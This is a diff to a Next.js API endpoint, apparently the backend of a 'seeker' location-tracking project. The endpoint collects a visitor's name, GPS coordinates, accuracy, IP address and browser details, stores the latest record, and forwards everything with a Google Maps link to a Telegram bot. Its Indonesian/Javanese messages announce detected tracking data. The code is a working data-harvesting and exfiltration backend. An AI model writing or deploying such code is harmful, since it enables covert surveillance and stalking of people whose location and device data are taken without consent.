@@ -1,7 +1,23 @@
+// pages/api/location.ts
+
 import type { NextApiRequest, NextApiResponse } from 'next';
 
+type LocationData = {
+  nama: string;
+  lat: number;
+  lon: number;
+  acc: number;
+  ip: string | string[] | undefined;
+  userAgent: string | undefined;
+  timestamp: string;
+};
+
+const globalStore = global as any;
+globalStore.latestLocation = globalStore.latestLocation || null;
+
 export default async function handler(req: NextApiRequest, res: NextApiResponse) {
-  res.setHeader('Access-Control-Allow-Origin', '*');
+  // CORS
+  res.setHeader('Access-Control-Allow-Origin', 'https://seeker-project-vcl.vercel.app/');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
@@ -13,14 +29,18 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
   const userAgent = req.headers['user-agent'];
   const timestamp = new Date().toISOString();
 
+  // Simpan data untuk real-time
+  globalStore.latestLocation = { nama, lat, lon, acc, ip, userAgent, timestamp };
+
+  // Kirim ke Telegram
   const botToken = process.env.TELEGRAM_BOT_TOKEN!;
   const chatId = process.env.TELEGRAM_CHAT_ID!;
   const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
 
   const message = `
-📥 *Pelacakan Lokasi Baru*
+📥 *Mass enek...Data Pelacakan Terdeteksi*
 
-👤 *Nama:* ${nama}
+👤 *Jeneng:* ${nama}
 🖥️ *Perangkat:* ${userAgent}
 🌐 *IP Address:* ${ip}
 📍 *Lokasi:*
@@ -45,5 +65,5 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse)
     })
   });
 
-  res.status(200).json({ message: 'Terkirim ke Telegram' });
+  res.status(200).json({ message: 'Data dikirim ke Telegram & disimpan' });
 }
